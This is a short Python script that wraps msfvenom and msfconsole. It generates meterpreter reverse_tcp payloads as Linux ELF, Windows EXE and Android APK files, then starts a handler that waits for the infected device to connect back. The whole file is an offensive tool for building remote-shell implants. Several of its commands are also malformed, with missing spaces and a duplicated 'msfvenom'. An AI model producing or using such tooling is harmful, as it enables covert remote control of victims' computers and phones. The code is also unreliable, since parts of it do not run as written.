import os

print("---------------Base Info---------------")
IPserver=input("IP-s: ")
Porttunnel=input("Port-s: ")
output=input("name-file: ")
print("linux, windows, android")
platform=input("platform: ")

if platform=='linux':
  print('aarch64 or x86')
  arch=input('Select arch: ')
  if arch=='x86':
    print("---------------Payload Creation---------------")
    payload='msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST='+IPserver+'LPORT='+Porttunnel+' --platform linux -a x86 -f elf -o '+output+'.elf'
    os.system('sudo '+payload)
    print('---------------Starting---------------')
    print('you want to wait for a connection from the file?')
    listing=input('y/n: ')
    if listing=='y':
      os.system('sudo msfconsole -x "use exploit/multi/handler; set PAYLOAD linux/x86/meterpreter/reverse_tcp; set LHOST'+IPserver+';set LPORT '+Porttunnel+'; run"')
    #aarch64
  elif arch=='aarch64':
    payload='msfvenom -p linux/aarch64/meterpreter/reverse_tcp LHOST='+IPserver+' LPORT='+Porttunnel+' -f elf -o '+output+'.elf'
    os.system('sudo '+payload)
    print('---------------Starting---------------')
    print('you want to wait for a connection from the file?')
    listing=input('y/n: ')
    if listing=='y':
      os.system('sudo msfconsole -x "use exploit/multi/handler; set PAYLOAD linux/aarch64/meterpreter/reverse_tcp; set LHOST '+IPserver+'; set LPORT '+Porttunnel+'; run"')
elif platform=='windows':
  print("---------------Payload Creation---------------")
  payload='msfvenom -p windows/meterpreter/reverse_tcp LHOST='+IPserver+' LPORT='+Porttunnel+' -f exe -o '+output+'.exe'
  os.system('sudo msfvenom '+payload)
  print('---------------Starting---------------')
  listing=input('y/n: ')
  if listing=='y':
    os.system('sudo msfconsole -x "use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST '+IPserver+'; set LPORT '+Porttunnel+'; run"')
elif platform=='android':
  print("---------------Payload Creation---------------")
  payload='msfvenom -p android/meterpreter/reverse_tcp LHOST='+IPserver+' LPORT='+Porttunnel+' -o '+output+'.apk'
  os.system('sudo msfvenom '+payload)
  print('---------------Starting---------------')
  listing=input('y/n: ')
  if listing=='y':
    os.system('sudo msfconsole -x "use exploit/multi/handler; set PAYLOAD android/meterpreter/reverse_tcp; set LHOST '+IPserver+'; set LPORT '+Porttunnel+'; run"')


  
